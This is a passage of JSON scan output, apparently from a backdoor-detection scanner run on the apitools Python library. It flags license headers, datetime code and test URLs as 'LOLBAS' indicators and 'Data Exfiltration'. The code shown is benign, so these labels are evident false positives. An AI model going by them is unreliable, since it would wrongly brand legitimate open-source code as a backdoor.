            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/uptodate_check_test.py"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 43,
                  "endLine": 37,
                  "endColumn": 49,
                  "snippet": {
                    "text": "class ClientGenCliTest(unittest.TestCase):\n\n    def AssertDiffEqual(self, expected, actual):\n        \"\"\"Like unittest.assertEqual with a diff in the exception message.\"\"\"\n        if expected != actual:\n            unified_diff = difflib.unified_diff(\n                expected.splitlines(), actual.splitlines())\n",
                    "rendered": {
                      "text": "class ClientGenCliTest(unittest.TestCase):\n\n    def AssertDiffEqual(self, expected, actual):\n        \"\"\"Like unittest.assertEqual with a diff in the exception message.\"\"\"\n        if expected != actual:\n            unified_diff = difflib.unified_diff(\n                expected.splitlines(), actual.splitlines())\n",
                      "markdown": "`class ClientGenCliTest(unittest.TestCase):\n\n    def AssertDiffEqual(self, expected, actual):\n        \"\"\"Like unittest.assertEqual with a diff in the exception message.\"\"\"\n        if expected != actual:\n            unified_diff = difflib.unified_diff(\n                expected.splitlines(), actual.splitlines())\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/regenerate_samples.py"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 38,
                  "endLine": 6,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/regenerate_samples.py"
                },
                "region": {
                  "startLine": 40,
                  "startColumn": 28,
                  "endLine": 40,
                  "endColumn": 33,
                  "snippet": {
                    "text": "def _Generate(samples):\n    # insert $PWD onto PYTHONPATH\n    insert_python_dir = os.getcwd()\n    python_path = os.environ.get('PYTHONPATH')\n    if python_path:\n      python_path = os.pathsep.join([insert_python_dir, python_path])\n    else:\n",
                    "rendered": {
                      "text": "def _Generate(samples):\n    # insert $PWD onto PYTHONPATH\n    insert_python_dir = os.getcwd()\n    python_path = os.environ.get('PYTHONPATH')\n    if python_path:\n      python_path = os.pathsep.join([insert_python_dir, python_path])\n    else:\n",
                      "markdown": "`def _Generate(samples):\n    # insert $PWD onto PYTHONPATH\n    insert_python_dir = os.getcwd()\n    python_path = os.environ.get('PYTHONPATH')\n    if python_path:\n      python_path = os.pathsep.join([insert_python_dir, python_path])\n    else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/regenerate_samples.py"
                },
                "region": {
                  "startLine": 40,
                  "startColumn": 21,
                  "endLine": 40,
                  "endColumn": 32,
                  "snippet": {
                    "text": "def _Generate(samples):\n    # insert $PWD onto PYTHONPATH\n    insert_python_dir = os.getcwd()\n    python_path = os.environ.get('PYTHONPATH')\n    if python_path:\n      python_path = os.pathsep.join([insert_python_dir, python_path])\n    else:\n",
                    "rendered": {
                      "text": "def _Generate(samples):\n    # insert $PWD onto PYTHONPATH\n    insert_python_dir = os.getcwd()\n    python_path = os.environ.get('PYTHONPATH')\n    if python_path:\n      python_path = os.pathsep.join([insert_python_dir, python_path])\n    else:\n",
                      "markdown": "`def _Generate(samples):\n    # insert $PWD onto PYTHONPATH\n    insert_python_dir = os.getcwd()\n    python_path = os.environ.get('PYTHONPATH')\n    if python_path:\n      python_path = os.pathsep.join([insert_python_dir, python_path])\n    else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/__init__.py"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 38,
                  "endLine": 6,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/scripts/__init__.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/message_types.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/message_types.py"
                },
                "region": {
                  "startLine": 109,
                  "startColumn": 59,
                  "endLine": 109,
                  "endColumn": 65,
                  "snippet": {
                    "text": "                                                          tz=value.tzinfo)\n        delta = value - local_epoch\n\n        # Create and fill in the DateTimeMessage, including time zone if\n        # one was specified.\n        message = DateTimeMessage()\n        message.milliseconds = int(util.total_seconds(delta) * 1000)\n",
                    "rendered": {
                      "text": "                                                          tz=value.tzinfo)\n        delta = value - local_epoch\n\n        # Create and fill in the DateTimeMessage, including time zone if\n        # one was specified.\n        message = DateTimeMessage()\n        message.milliseconds = int(util.total_seconds(delta) * 1000)\n",
                      "markdown": "`                                                          tz=value.tzinfo)\n        delta = value - local_epoch\n\n        # Create and fill in the DateTimeMessage, including time zone if\n        # one was specified.\n        message = DateTimeMessage()\n        message.milliseconds = int(util.total_seconds(delta) * 1000)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/message_types.py"
                },
                "region": {
                  "startLine": 85,
                  "startColumn": 49,
                  "endLine": 85,
                  "endColumn": 55,
                  "snippet": {
                    "text": "                message.milliseconds / 1000.0)\n\n        # Need to subtract the time zone offset, because when we call\n        # datetime.fromtimestamp, it will add the time zone offset to the\n        # value we pass.\n        milliseconds = (message.milliseconds -\n                        60000 * message.time_zone_offset)\n",
                    "rendered": {
                      "text": "                message.milliseconds / 1000.0)\n\n        # Need to subtract the time zone offset, because when we call\n        # datetime.fromtimestamp, it will add the time zone offset to the\n        # value we pass.\n        milliseconds = (message.milliseconds -\n                        60000 * message.time_zone_offset)\n",
                      "markdown": "`                message.milliseconds / 1000.0)\n\n        # Need to subtract the time zone offset, because when we call\n        # datetime.fromtimestamp, it will add the time zone offset to the\n        # value we pass.\n        milliseconds = (message.milliseconds -\n                        60000 * message.time_zone_offset)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/message_types.py"
                },
                "region": {
                  "startLine": 84,
                  "startColumn": 30,
                  "endLine": 84,
                  "endColumn": 36,
                  "snippet": {
                    "text": "            return datetime.datetime.utcfromtimestamp(\n                message.milliseconds / 1000.0)\n\n        # Need to subtract the time zone offset, because when we call\n        # datetime.fromtimestamp, it will add the time zone offset to the\n        # value we pass.\n        milliseconds = (message.milliseconds -\n",
                    "rendered": {
                      "text": "            return datetime.datetime.utcfromtimestamp(\n                message.milliseconds / 1000.0)\n\n        # Need to subtract the time zone offset, because when we call\n        # datetime.fromtimestamp, it will add the time zone offset to the\n        # value we pass.\n        milliseconds = (message.milliseconds -\n",
                      "markdown": "`            return datetime.datetime.utcfromtimestamp(\n                message.milliseconds / 1000.0)\n\n        # Need to subtract the time zone offset, because when we call\n        # datetime.fromtimestamp, it will add the time zone offset to the\n        # value we pass.\n        milliseconds = (message.milliseconds -\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/message_types.py"
                },
                "region": {
                  "startLine": 53,
                  "startColumn": 51,
                  "endLine": 53,
                  "endColumn": 57,
                  "snippet": {
                    "text": "class DateTimeField(messages.MessageField):\n    \"\"\"Field definition for datetime values.\n\n    Stores a python datetime object as a field.  If time zone information is\n    included in the datetime object, it will be included in\n    the encoded data when this is encoded/decoded.\n    \"\"\"\n",
                    "rendered": {
                      "text": "class DateTimeField(messages.MessageField):\n    \"\"\"Field definition for datetime values.\n\n    Stores a python datetime object as a field.  If time zone information is\n    included in the datetime object, it will be included in\n    the encoded data when this is encoded/decoded.\n    \"\"\"\n",
                      "markdown": "`class DateTimeField(messages.MessageField):\n    \"\"\"Field definition for datetime values.\n\n    Stores a python datetime object as a field.  If time zone information is\n    included in the datetime object, it will be included in\n    the encoded data when this is encoded/decoded.\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/message_types.py"
                },
                "region": {
                  "startLine": 44,
                  "startColumn": 32,
                  "endLine": 44,
                  "endColumn": 38,
                  "snippet": {
                    "text": "\n    Fields:\n      milliseconds: Milliseconds since Jan 1st 1970 local time.\n      time_zone_offset: Optional time zone offset, in minutes from UTC.\n    \"\"\"\n    milliseconds = messages.IntegerField(1, required=True)\n    time_zone_offset = messages.IntegerField(2)\n",
                    "rendered": {
                      "text": "\n    Fields:\n      milliseconds: Milliseconds since Jan 1st 1970 local time.\n      time_zone_offset: Optional time zone offset, in minutes from UTC.\n    \"\"\"\n    milliseconds = messages.IntegerField(1, required=True)\n    time_zone_offset = messages.IntegerField(2)\n",
                      "markdown": "`\n    Fields:\n      milliseconds: Milliseconds since Jan 1st 1970 local time.\n      time_zone_offset: Optional time zone offset, in minutes from UTC.\n    \"\"\"\n    milliseconds = messages.IntegerField(1, required=True)\n    time_zone_offset = messages.IntegerField(2)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/testing/mock_test.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/testing/mock_test.py"
                },
                "region": {
                  "startLine": 234,
                  "startColumn": 21,
                  "endLine": 234,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        with mock.Client(fusiontables.FusiontablesV1):\n            mocked_services = _GetApiServices(fusiontables.FusiontablesV1)\n            self.assertEquals(services.keys(), mocked_services.keys())\n            for name, service in six.iteritems(services):\n                mocked_service = mocked_services[name]\n                methods = service.GetMethodsList()\n                for method in methods:\n",
                    "rendered": {
                      "text": "        with mock.Client(fusiontables.FusiontablesV1):\n            mocked_services = _GetApiServices(fusiontables.FusiontablesV1)\n            self.assertEquals(services.keys(), mocked_services.keys())\n            for name, service in six.iteritems(services):\n                mocked_service = mocked_services[name]\n                methods = service.GetMethodsList()\n                for method in methods:\n",
                      "markdown": "`        with mock.Client(fusiontables.FusiontablesV1):\n            mocked_services = _GetApiServices(fusiontables.FusiontablesV1)\n            self.assertEquals(services.keys(), mocked_services.keys())\n            for name, service in six.iteritems(services):\n                mocked_service = mocked_services[name]\n                methods = service.GetMethodsList()\n                for method in methods:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/testing/__init__.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer_test.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer_test.py"
                },
                "region": {
                  "startLine": 340,
                  "startColumn": 35,
                  "endLine": 340,
                  "endColumn": 44,
                  "snippet": {
                    "text": "        # Sample url_builder.\n        self.url_builder = base_api._UrlBuilder('http://www.uploads.com')\n        # Sample request.\n        self.request = http_wrapper.Request(\n            'http://www.uploads.com',\n            headers={'content-type': 'text/plain'})\n        # Sample successful response.\n",
                    "rendered": {
                      "text": "        # Sample url_builder.\n        self.url_builder = base_api._UrlBuilder('http://www.uploads.com')\n        # Sample request.\n        self.request = http_wrapper.Request(\n            'http://www.uploads.com',\n            headers={'content-type': 'text/plain'})\n        # Sample successful response.\n",
                      "markdown": "`        # Sample url_builder.\n        self.url_builder = base_api._UrlBuilder('http://www.uploads.com')\n        # Sample request.\n        self.request = http_wrapper.Request(\n            'http://www.uploads.com',\n            headers={'content-type': 'text/plain'})\n        # Sample successful response.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer_test.py"
                },
                "region": {
                  "startLine": 321,
                  "startColumn": 39,
                  "endLine": 321,
                  "endColumn": 48,
                  "snippet": {
                    "text": "                six.BytesIO(upload_bytes),\n                'text/plain',\n                total_size=len(upload_bytes))\n            http_request = http_wrapper.Request(\n                'http://www.uploads.com',\n                headers={'content-type': 'text/plain'})\n            upload.ConfigureRequest(upload_config, http_request, url_builder)\n",
                    "rendered": {
                      "text": "                six.BytesIO(upload_bytes),\n                'text/plain',\n                total_size=len(upload_bytes))\n            http_request = http_wrapper.Request(\n                'http://www.uploads.com',\n                headers={'content-type': 'text/plain'})\n            upload.ConfigureRequest(upload_config, http_request, url_builder)\n",
                      "markdown": "`                six.BytesIO(upload_bytes),\n                'text/plain',\n                total_size=len(upload_bytes))\n            http_request = http_wrapper.Request(\n                'http://www.uploads.com',\n                headers={'content-type': 'text/plain'})\n            upload.ConfigureRequest(upload_config, http_request, url_builder)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer_test.py"
                },
                "region": {
                  "startLine": 304,
                  "startColumn": 39,
                  "endLine": 304,
                  "endColumn": 48,
                  "snippet": {
                    "text": "                six.BytesIO(upload_bytes),\n                'text/plain',\n                total_size=len(upload_bytes))\n            http_request = http_wrapper.Request(\n                'http://www.uploads.com',\n                headers={'content-type': 'text/plain'},\n                body=multipart_body)\n",
                    "rendered": {
                      "text": "                six.BytesIO(upload_bytes),\n                'text/plain',\n                total_size=len(upload_bytes))\n            http_request = http_wrapper.Request(\n                'http://www.uploads.com',\n                headers={'content-type': 'text/plain'},\n                body=multipart_body)\n",
                      "markdown": "`                six.BytesIO(upload_bytes),\n                'text/plain',\n                total_size=len(upload_bytes))\n            http_request = http_wrapper.Request(\n                'http://www.uploads.com',\n                headers={'content-type': 'text/plain'},\n                body=multipart_body)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer_test.py"
                },
                "region": {
                  "startLine": 237,
                  "startColumn": 34,
                  "endLine": 237,
                  "endColumn": 43,
                  "snippet": {
                    "text": "        with mock.patch.object(http_wrapper, 'MakeRequest',\n                               autospec=True) as make_request:\n            make_request.side_effect = _ReturnBytes\n            request = http_wrapper.Request(url='https://part.one/')\n            download.InitializeDownload(request, http=http)\n            self.assertEqual(2, make_request.call_count)\n            for call in make_request.call_args_list:\n",
                    "rendered": {
                      "text": "        with mock.patch.object(http_wrapper, 'MakeRequest',\n                               autospec=True) as make_request:\n            make_request.side_effect = _ReturnBytes\n            request = http_wrapper.Request(url='https://part.one/')\n            download.InitializeDownload(request, http=http)\n            self.assertEqual(2, make_request.call_count)\n            for call in make_request.call_args_list:\n",
                      "markdown": "`        with mock.patch.object(http_wrapper, 'MakeRequest',\n                               autospec=True) as make_request:\n            make_request.side_effect = _ReturnBytes\n            request = http_wrapper.Request(url='https://part.one/')\n            download.InitializeDownload(request, http=http)\n            self.assertEqual(2, make_request.call_count)\n            for call in make_request.call_args_list:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer_test.py"
                },
                "region": {
                  "startLine": 187,
                  "startColumn": 34,
                  "endLine": 187,
                  "endColumn": 43,
                  "snippet": {
                    "text": "                content=string.ascii_lowercase * 2,\n                request_url=base_url,\n            )\n            request = http_wrapper.Request(url='https://part.one/')\n            download.InitializeDownload(request, http=http)\n            self.assertEqual(1, make_request.call_count)\n            received_request = make_request.call_args[0][1]\n",
                    "rendered": {
                      "text": "                content=string.ascii_lowercase * 2,\n                request_url=base_url,\n            )\n            request = http_wrapper.Request(url='https://part.one/')\n            download.InitializeDownload(request, http=http)\n            self.assertEqual(1, make_request.call_count)\n            received_request = make_request.call_args[0][1]\n",
                      "markdown": "`                content=string.ascii_lowercase * 2,\n                request_url=base_url,\n            )\n            request = http_wrapper.Request(url='https://part.one/')\n            download.InitializeDownload(request, http=http)\n            self.assertEqual(1, make_request.call_count)\n            received_request = make_request.call_args[0][1]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/transfer_test.py"
                },
                "region": {
                  "startLine": 160,
                  "startColumn": 38,
                  "endLine": 160,
                  "endColumn": 47,
                  "snippet": {
                    "text": "                    content=string.ascii_lowercase[start_byte:end_byte + 1],\n                    request_url=base_url,\n                )\n                request = http_wrapper.Request(url='https://part.one/')\n                download.InitializeDownload(request, http=http)\n                download.GetRange(start_byte, end_byte)\n                self.assertEqual(1, make_request.call_count)\n",
                    "rendered": {
                      "text": "                    content=string.ascii_lowercase[start_byte:end_byte + 1],\n                    request_url=base_url,\n                )\n                request = http_wrapper.Request(url='https://part.one/')\n                download.InitializeDownload(request, http=http)\n                download.GetRange(start_byte, end_byte)\n                self.assertEqual(1, make_request.call_count)\n",
                      "markdown": "`                    content=string.ascii_lowercase[start_byte:end_byte + 1],\n                    request_url=base_url,\n                )\n                request = http_wrapper.Request(url='https://part.one/')\n                download.InitializeDownload(request, http=http)\n                download.GetRange(start_byte, end_byte)\n                self.assertEqual(1, make_request.call_count)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
